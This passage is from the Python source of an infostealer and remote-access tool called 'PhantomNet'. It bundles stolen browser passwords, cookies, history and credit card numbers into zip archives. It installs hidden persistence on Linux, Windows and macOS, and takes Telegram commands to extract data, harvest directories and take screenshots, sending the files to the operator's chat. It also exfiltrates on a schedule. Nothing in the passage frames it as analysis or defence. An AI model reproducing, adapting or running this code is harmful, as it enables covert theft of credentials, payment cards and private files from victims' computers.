        si = data.get("system", {})
        files["system_info.txt"] = "\n".join(f"{k}: {v}" for k, v in si.items())
        files["full_data.json"] = json.dumps(data, indent=2, default=str)

        method = data.get("method", "unknown")
        if method == "go_shared_lib":
            pass  # Go lib returns a flat dict per browser; already in full_data.json
        else:
            for browser, prof_dict in data.get("browsers", {}).items():
                for prof_name, pdata in prof_dict.items():
                    if not isinstance(pdata, dict):
                        continue
                    pfx = f"{browser}_{prof_name}"

                    if pdata.get("passwords"):
                        txt = f"=== {browser.upper()} | {prof_name} PASSWORDS ===\n\n"
                        for p in pdata["passwords"]:
                            txt += (f"URL:      {p['url']}\nUsername: {p['username']}\n"
                                    f"Password: {p['password']}\nLast used:{p.get('last_used', '')}\n\n")
                        files[f"{pfx}_passwords.txt"] = txt

                    if pdata.get("cookies"):
                        txt = f"=== {browser.upper()} | {prof_name} COOKIES ({len(pdata['cookies'])}) ===\n\n"
                        for c in pdata["cookies"][:500]:
                            txt += (f"Host:  {c['host']}\nName:  {c['name']}\n"
                                    f"Value: {str(c.get('value', ''))[:200]}\n\n")
                        files[f"{pfx}_cookies.txt"] = txt

                    if pdata.get("history"):
                        txt = f"=== {browser.upper()} | {prof_name} HISTORY ({len(pdata['history'])}) ===\n\n"
                        for h in pdata["history"][:500]:
                            txt += (f"URL:   {h['url']}\nTitle: {h.get('title', '')}\n"
                                    f"Visits:{h.get('visits', '')}\nLast:  {h.get('last_visit', '')}\n\n")
                        files[f"{pfx}_history.txt"] = txt

                    if pdata.get("bookmarks"):
                        txt = f"=== {browser.upper()} | {prof_name} BOOKMARKS ===\n\n"
                        for b in pdata["bookmarks"]:
                            txt += (f"Name:   {b.get('name', '')}\nURL:    {b.get('url', '')}\n"
                                    f"Folder: {b.get('folder', '')}\n\n")
                        files[f"{pfx}_bookmarks.txt"] = txt

                    if pdata.get("credit_cards"):
                        txt = f"=== {browser.upper()} | {prof_name} CREDIT CARDS ===\n\n"
                        for cc in pdata["credit_cards"]:
                            txt += f"Name:   {cc['name']}\nNumber: {cc['number']}\nExpiry: {cc['expiry']}\n\n"
                        files[f"{pfx}_credit_cards.txt"] = txt

                    if pdata.get("downloads"):
                        txt = f"=== {browser.upper()} | {prof_name} DOWNLOADS ({len(pdata['downloads'])}) ===\n\n"
                        for d in pdata["downloads"][:200]:
                            txt += f"URL:  {d.get('url', '')}\nPath: {d.get('path', '')}\nDate: {d.get('date', '')}\n\n"
                        files[f"{pfx}_downloads.txt"] = txt

        for fname, content in files.items():
            (tmp_dir / fname).write_text(content, encoding="utf-8")

        hostname = si.get("hostname", "host") or "host"
        plat_tag = _PLAT.lower()
        zip_name = f"{plat_tag}_{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        zip_path = Path(tempfile.gettempdir()) / zip_name
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in tmp_dir.iterdir():
                zf.write(f, f.name)
        return zip_path
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

# ========================= PERSISTENCE ============================


def install_persistence():
    script = str(Path(__file__).resolve())
    interp = sys.executable
    home = Path.home()

    if _PLAT == "Linux":
        # systemd user service
        try:
            svc_dir = home / ".config" / "systemd" / "user"
            svc_dir.mkdir(parents=True, exist_ok=True)
            svc = svc_dir / "phantomnet-agent.service"
            svc.write_text(
                "[Unit]\nDescription=PhantomNet Agent\nAfter=network.target\n\n"
                "[Service]\nType=simple\n"
                f"ExecStart={interp} {script}\n"
                "Restart=always\nRestartSec=60\n\n"
                "[Install]\nWantedBy=default.target\n"
            )
            subprocess.run(["systemctl", "--user", "daemon-reload"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["systemctl", "--user", "enable", "--now", "phantomnet-agent.service"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return
        except Exception:
            pass

        # cron fallback
        try:
            res = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            cron = res.stdout if res.returncode == 0 else ""
            entry = f"@reboot {interp} {script} >/dev/null 2>&1 &\n"
            if script not in cron:
                proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
                proc.communicate((cron + entry).encode())
        except Exception:
            pass

        # XDG autostart
        try:
            ad = home / ".config" / "autostart"
            ad.mkdir(parents=True, exist_ok=True)
            (ad / "phantomnet-agent.desktop").write_text(
                "[Desktop Entry]\nType=Application\nName=System Agent\n"
                f"Exec={interp} {script}\nHidden=false\nNoDisplay=true\n"
                "X-GNOME-Autostart-enabled=true\n"
            )
        except Exception:
            pass

    elif _PLAT == "Windows":
        # Registry Run key
        try:
            import winreg  # type: ignore
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(key, "PhantomNetAgent", 0, winreg.REG_SZ,
                              f'"{interp}" "{script}"')
            winreg.CloseKey(key)
        except Exception:
            pass

        # Startup folder shortcut fallback
        try:
            startup = Path(os.environ.get("APPDATA", "")) / \
                      "Microsoft/Windows/Start Menu/Programs/Startup"
            bat = startup / "phantomnet-agent.bat"
            bat.write_text(f'@echo off\nstart "" /B "{interp}" "{script}"\n')
        except Exception:
            pass

    elif _PLAT == "Darwin":
        # LaunchAgent plist
        try:
            la_dir = home / "Library" / "LaunchAgents"
            la_dir.mkdir(parents=True, exist_ok=True)
            plist = la_dir / "com.phantomnet.agent.plist"
            plist.write_text(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
                '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
                '<plist version="1.0"><dict>\n'
                '<key>Label</key><string>com.phantomnet.agent</string>\n'
                f'<key>ProgramArguments</key><array><string>{interp}</string>'
                f'<string>{script}</string></array>\n'
                '<key>RunAtLoad</key><true/>\n'
                '<key>KeepAlive</key><true/>\n'
                '</dict></plist>\n'
            )
            subprocess.run(["launchctl", "load", str(plist)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

# ========================= LOCK FILE =============================

_LOCK = Path(tempfile.gettempdir()) / f"phantomnet_{os.getuid() if hasattr(os, 'getuid') else os.getpid()}.lock"


def _acquire_lock():
    if _LOCK.exists():
        try:
            pid = int(_LOCK.read_text().strip())
            os.kill(pid, 0)
            return False
        except (ProcessLookupError, PermissionError):
            pass
        except Exception:
            pass
    _LOCK.write_text(str(os.getpid()))
    atexit.register(lambda: _LOCK.unlink() if _LOCK.exists() else None)
    return True

# ===================== COMMAND HANDLERS ===========================


def handle_command(text, chat_id):
    cmd = text.split()[0].split("@")[0].lower().strip()
    args = text.split()[1:]

    if cmd in ("/start", "/help"):
        send_message(
            "<b>PhantomNet Client</b>\n\n"
            "<b>Commands:</b>\n"
            "/extract  — Collect all browser data (ZIP)\n"
            "/harvest [path] — Archive a directory tree\n"
            "/info     — System information\n"
            "/browsers — List detected browsers\n"
            "/screenshot — Capture a screenshot\n"
            "/status   — Bot status + uptime\n"
            "/help     — This message",
            chat_id,
        )

    elif cmd == "/extract":
        send_message("Collecting browser data...", chat_id)
        zip_path = None
        try:
            data = collect_all()
            zip_path = make_zip(data)
            method = data.get("method", "unknown")
            stats = (
                f"<b>Extraction complete</b>\n\n"
                f"<b>Method:</b>      {method}\n"
                f"<b>Host:</b>        {data.get('system', {}).get('hostname')}\n"
                f"<b>User:</b>        {data.get('system', {}).get('username')}\n"
                f"<b>Passwords:</b>   {_count(data, 'passwords')}\n"
                f"<b>Cookies:</b>     {_count(data, 'cookies')}\n"
                f"<b>History:</b>     {_count(data, 'history')}\n"
                f"<b>Credit cards:</b>{_count(data, 'credit_cards')}"
            )
            send_message(stats, chat_id)
            send_file(str(zip_path), chat_id, "Browser data extraction")
        except Exception as e:
            send_message(f"Error during extraction: {e}", chat_id)
        finally:
            if zip_path:
                try:
                    zip_path.unlink()
                except Exception:
                    pass

    elif cmd == "/harvest":
        src = args[0] if args else None
        send_message(f"Harvesting files from: {src or 'filesystem root'}...", chat_id)
        try:
            out_path, summary = harvest_directory(source_path=src)
            if out_path:
                send_message(f"<b>Harvest complete</b>\n{summary}", chat_id)
                send_file(out_path, chat_id, "Harvest archive")
                try:
                    os.unlink(out_path)
                except Exception:
                    pass
            else:
                send_message(f"Harvest failed: {summary}", chat_id)
        except Exception as e:
            send_message(f"Harvest error: {e}", chat_id)

    elif cmd == "/info":
        info = system_info()
        send_message(
            "<b>System Information:</b>\n"
            + "\n".join(f"<b>{k}:</b> {v}" for k, v in info.items()),
            chat_id,
        )

    elif cmd == "/browsers":
        send_message("Scanning for browsers...", chat_id)
        paths = find_browser_paths()
        if not paths:
            send_message("No browsers detected.", chat_id)
            return
        txt = f"<b>Browsers detected: {len(paths)}</b>\n\n"
        for b, p in paths.items():
            if isinstance(p, list):
                txt += f"<b>{b}</b> ({len(p)} profile(s))\n"
            else:
                txt += f"<b>{b}</b> (Firefox-based)\n"
        send_message(txt, chat_id)

    elif cmd == "/screenshot":
        send_message("Capturing screenshot...", chat_id)
        path = capture_screenshot()
        if path:
            send_file(path, chat_id, "Screenshot")
            try:
                os.unlink(path)
            except Exception:
                pass
        else:
            send_message("Screenshot capture failed (no supported tool found).", chat_id)

    elif cmd == "/status":
        uptime_s = int(time.time() - _START_TIME)
        h, rem = divmod(uptime_s, 3600)
        m, s = divmod(rem, 60)
        send_message(
            f"<b>Status:</b> Running\n"
            f"<b>Platform:</b> {_PLAT}\n"
            f"<b>Go lib:</b> {'loaded' if _go_lib else 'not available'}\n"
            f"<b>Uptime:</b> {h}h {m}m {s}s\n"
            f"<b>Python:</b> {sys.version.split()[0]}\n"
            f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            chat_id,
        )

    else:
        send_message(f"Unknown command: <code>{cmd}</code> — use /help", chat_id)

# ========================= BOT LOOP ==============================


def _auto_extract():
    while True:
        time.sleep(CHECK_INTERVAL)
        try:
            data = collect_all()
            zp = make_zip(data)
            send_message(f"Scheduled extraction — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            send_file(str(zp), caption="Scheduled extraction")
            try:
                zp.unlink()
            except Exception:
                pass
        except Exception as e:
            print(f"[auto_extract] Error: {e}")
            try:
                send_message(f"Scheduled extraction failed: {e}")
            except Exception:
                pass


def _drain_updates():
    url = f"{_API}/getUpdates"
    try:
        r = requests.get(url, params={"timeout": 0, "offset": -1}, timeout=10)
        data = r.json()
        if data.get("ok") and data.get("result"):
            return data["result"][-1]["update_id"] + 1
    except Exception:
        pass
    return None


def run_bot():
    delete_webhook()

    si = system_info()
    msg = (
        f"<b>PhantomNet Online</b>\n\n"
        f"<b>Host:</b>     {si['hostname']}\n"
        f"<b>User:</b>     {si['username']}\n"
        f"<b>Platform:</b> {si['platform']} {si['release']}\n"
        f"<b>Go lib:</b>   {si['go_lib']}\n"
        f"<b>Time:</b>     {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"Use /help for available commands."
    )
    send_message(msg)

    offset = _drain_updates()
    errors = 0

    while True:
        updates = get_updates(offset)
        if updates is None:
            errors += 1
            wait = min(2 ** errors, 120)
            print(f'[poll] No response, retry in {wait}s (errors={errors})')
            time.sleep(wait)
            if errors >= 5:
                delete_webhook()
                errors = 0
            continue
        errors = 0
        for upd in updates.get("result", []):
            offset = upd["update_id"] + 1
            msg = upd.get("message", {})
            text = msg.get("text", "")
            cid = msg.get("chat", {}).get("id")
            if text.startswith("/") and cid:
                if not _is_authorized(cid):
                    send_message('Unauthorized.', cid)
                    continue
                try:
                    handle_command(text, cid)
                except Exception as e:
                    send_message(f"Error: {e}", cid)
        time.sleep(1)

# ============================= MAIN ===============================


def main():
    if not _acquire_lock():
        sys.exit(0)

    if AUTO_PERSIST:
        try:
            install_persistence()
        except Exception:
            pass

    if CHECK_INTERVAL > 0:
        threading.Thread(target=_auto_extract, daemon=True).start()

    while True:
        try:
            run_bot()
        except KeyboardInterrupt:
            send_message("PhantomNet client stopped.")
            break
        except Exception:
            time.sleep(60)


if __name__ == "__main__":
    main()
